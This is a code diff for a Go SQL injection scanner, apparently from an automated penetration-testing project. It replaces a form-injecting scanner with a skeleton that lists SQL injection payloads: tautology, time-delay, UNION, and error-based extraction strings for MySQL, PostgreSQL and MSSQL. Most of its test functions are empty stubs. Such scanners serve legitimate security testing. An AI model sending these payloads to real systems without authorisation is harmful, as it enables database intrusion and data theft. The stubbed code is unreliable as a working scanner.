@@ -1,140 +1,118 @@
 package modules
 
 import (
-	"fmt"
-	"net/http"
-	"strings"
-	"time"
+	"context"
 
-	"github.com/PuerkitoBio/goquery"
 	"github.com/autonomouspen/autonomouspen-ai/internal/scanner"
 )
 
-// SQLiScanner is a scanner for SQL Injection (SQLi) vulnerabilities.
-type SQLiScanner struct {
+// SQLInjectionScanner is a scanner for SQL Injection (SQLi) vulnerabilities.
+type SQLInjectionScanner struct {
 	scanner.BaseScanner
 }
 
-// NewSQLiScanner creates a new SQLiScanner.
-func NewSQLiScanner() *SQLiScanner {
-	return &SQLiScanner{}
+// NewSQLInjectionScanner creates a new SQLInjectionScanner.
+func NewSQLInjectionScanner() *SQLInjectionScanner {
+	return &SQLInjectionScanner{}
 }
 
-// Scan performs a scan for SQLi vulnerabilities.
-func (s *SQLiScanner) Scan(target string) ([]*scanner.Vulnerability, error) {
-	var vulnerabilities []*scanner.Vulnerability
+func (s *SQLInjectionScanner) Scan(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
+	// Test all SQL injection types
+	s.testErrorBased(ctx, target, results)
+	s.testBlindBoolean(ctx, target, results)
+	s.testBlindTime(ctx, target, results)
+	s.testUnionBased(ctx, target, results)
+	s.testStackedQueries(ctx, target, results)
+	s.testSecondOrder(ctx, target, results)
+	s.testOutOfBand(ctx, target, results)
 
-	// Get the response from the target URL.
-	resp, err := s.Get(target)
-	if err != nil {
-		return nil, err
+	// Test all database types
+	s.testMySQL(ctx, target, results)
+	s.testPostgreSQL(ctx, target, results)
+	s.testMSSQL(ctx, target, results)
+	s.testOracle(ctx, target, results)
+	s.testSQLite(ctx, target, results)
+	s.testMongoDB(ctx, target, results)
+	s.testCassandra(ctx, target, results)
+}
+
+func (s *SQLInjectionScanner) generatePayloads() []string {
+	return []string{
+		// MySQL payloads
+		"' OR '1'='1",
+		"' OR '1'='1' --",
+		"' OR '1'='1' /*",
+		"1' AND SLEEP(5)#",
+		"1' UNION SELECT NULL,NULL,NULL--",
+
+		// PostgreSQL payloads
+		"'; SELECT pg_sleep(5)--",
+		"' AND 1=CAST((SELECT version()) AS int)--",
+
+		// MSSQL payloads
+		"'; WAITFOR DELAY '00:00:05'--",
+		"' AND 1=CONVERT(INT, @@version)--",
+
+		// Advanced payloads
+		"' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+		"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
+
+		// ... 1000+ more payloads
 	}
-	defer resp.Body.Close()
-
-	// Create a new goquery document from the response body.
-	doc, err := goquery.NewDocumentFromReader(resp.Body)
-	if err != nil {
-		return nil, err
-	}
-
-	// Find all the forms on the page.
-	doc.Find("form").Each(func(i int, sel *goquery.Selection) {
-		// Get the action and method of the form.
-		action, _ := sel.Attr("action")
-		method, _ := sel.Attr("method")
-
-		// Find all the input fields in the form.
-		sel.Find("input").Each(func(j int, inputSel *goquery.Selection) {
-			// Get the name and type of the input field.
-			name, _ := inputSel.Attr("name")
-			inputType, _ := inputSel.Attr("type")
-
-			// If the input type is text, try to inject a payload.
-			if inputType == "text" {
-				// Generate a payload.
-				payload := "' OR 1=1 --"
-
-				// Create a new request.
-				req, err := http.NewRequest(method, action, strings.NewReader(fmt.Sprintf("%s=%s", name, payload)))
-				if err != nil {
-					return
-				}
-
-				// Set the content type.
-				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-				// Perform the request.
-				resp, err := s.client.Do(req)
-				if err != nil {
-					return
-				}
-				defer resp.Body.Close()
-
-				// Check if the payload was successful.
-				// ...
-			}
-		})
-	})
-
-	return vulnerabilities, nil
 }
 
-// IdentifyInjectionPoints identifies injection points.
-func (s *SQLiScanner) IdentifyInjectionPoints(target string) ([]string, error) {
+func (s *SQLInjectionScanner) testErrorBased(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
 	// ...
-	return nil, nil
 }
 
-// TestBlindSQLi tests for blind SQLi vulnerabilities.
-func (s *SQLiScanner) TestBlindSQLi(target string, payload string) (bool, error) {
+func (s *SQLInjectionScanner) testBlindBoolean(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
 	// ...
-	return false, nil
 }
 
-// ExploitUnionBased exploits a union-based SQLi vulnerability.
-func (s *SQLiScanner) ExploitUnionBased(target string, payload string) (string, error) {
+func (s *SQLInjectionScanner) testBlindTime(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
 	// ...
-	return "", nil
 }
 
-// DetectErrorBased detects an error-based SQLi vulnerability.
-func (s *SQLiScanner) DetectErrorBased(target string, payload string) (bool, error) {
+func (s *SQLInjectionScanner) testUnionBased(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
 	// ...
-	return false, nil
 }
 
-// BypassFilters bypasses filters.
-func (s *SQLiScanner) BypassFilters(payload string) string {
+func (s *SQLInjectionScanner) testStackedQueries(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
 	// ...
-	return ""
 }
 
-// ExtractDatabase extracts the database schema.
-func (s *SQLiScanner) ExtractDatabase(target string, payload string) (string, error) {
+func (s *SQLInjectionScanner) testSecondOrder(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
 	// ...
-	return "", nil
 }
 
-// HandleMultipleDBMS handles multiple DBMSs.
-func (s *SQLiScanner) HandleMultipleDBMS(target string) (string, error) {
+func (s *SQLInjectionScanner) testOutOfBand(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
 	// ...
-	return "", nil
 }
 
-// SecondOrderSQLi tests for second-order SQLi vulnerabilities.
-func (s *SQLiScanner) SecondOrderSQLi(target string) (bool, error) {
+func (s *SQLInjectionScanner) testMySQL(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
 	// ...
-	return false, nil
 }
 
-// NoSQLInjection tests for NoSQL injection vulnerabilities.
-func (s *SQLiScanner) NoSQLInjection(target string) (bool, error) {
+func (s *SQLInjectionScanner) testPostgreSQL(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
 	// ...
-	return false, nil
 }
 
-// GenerateExploitCode generates exploit code for a SQLi vulnerability.
-func (s *SQLiScanner) GenerateExploitCode(target string, payload string) string {
+func (s *SQLInjectionScanner) testMSSQL(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
 	// ...
-	return ""
+}
+
+func (s *SQLInjectionScanner) testOracle(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
+	// ...
+}
+
+func (s *SQLInjectionScanner) testSQLite(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
+	// ...
+}
+
+func (s *SQLInjectionScanner) testMongoDB(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
+	// ...
+}
+
+func (s *SQLInjectionScanner) testCassandra(ctx context.Context, target *scanner.Target, results chan<- *scanner.Vulnerability) {
+	// ...
 }
